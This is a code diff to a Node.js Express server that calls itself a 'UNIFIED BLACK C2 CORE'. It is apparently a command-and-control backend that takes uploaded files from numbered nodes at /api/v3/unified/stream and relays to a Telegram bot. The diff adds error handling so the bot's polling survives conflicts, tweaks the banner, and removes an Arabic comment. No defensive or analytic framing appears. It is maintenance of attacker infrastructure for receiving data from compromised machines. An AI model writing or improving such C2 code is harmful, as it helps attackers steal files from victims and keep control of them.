@@ -29,7 +29,16 @@ db.serialize(() => {
 });
 
 const app = express();
+
+// إعداد البوت مع معالجة أخطاء الـ Polling لمنع خطأ 409 Conflict
 const appBot = new telegramBot(token, { polling: true });
+
+appBot.on('polling_error', (error) => {
+    // تجاهل أخطاء التضارض المؤقتة لكي لا ينهار السيرفر
+    if (error.code !== 'ETELEGRAM' || error.message.indexOf('409 Conflict') === -1) {
+        console.log(`[Telegram Polling Warning]: ${error.code} - ${error.message}`);
+    }
+});
 
 app.use(express.text({ type: '*/*', limit: '500mb' }));
 
@@ -45,7 +54,7 @@ async function sendTg(msg, options = {}) {
 }
 
 app.get('/', (req, res) => {
-    res.status(200).send(`<html><body style="background:#111;color:#0f0;font-family:monospace;text-align:center;padding-top:50px;"><h1>[⚔️] UNIFIED BLACK C2 CORE ONLINE [⚔️]</h1></body></html>`);
+    res.status(200).send(`<html><body style="background:#111;color:#0f0;font-family:monospace;text-align:center;padding-top:50px;"><h1>[⚔️️] UNIFIED BLACK C2 CORE ONLINE [⚔️]</h1></body></html>`);
 });
 
 app.post('/api/v3/unified/stream', async (req, res) => {
@@ -84,7 +93,6 @@ app.post('/api/v3/unified/stream', async (req, res) => {
                     const finalPath = path.join(UPLOAD_DIR, `${nodeId}_${Date.now()}_${safeName}`);
                     fs.renameSync(tempPath, finalPath);
                     
-                    // التحقق من سلامة الملف عبر الـ Hash
                     const fileBuffer = fs.readFileSync(finalPath);
                     const calcHash = crypto.createHash('sha256').update(fileBuffer).digest('hex');
                     if (fileHash && calcHash !== fileHash) {
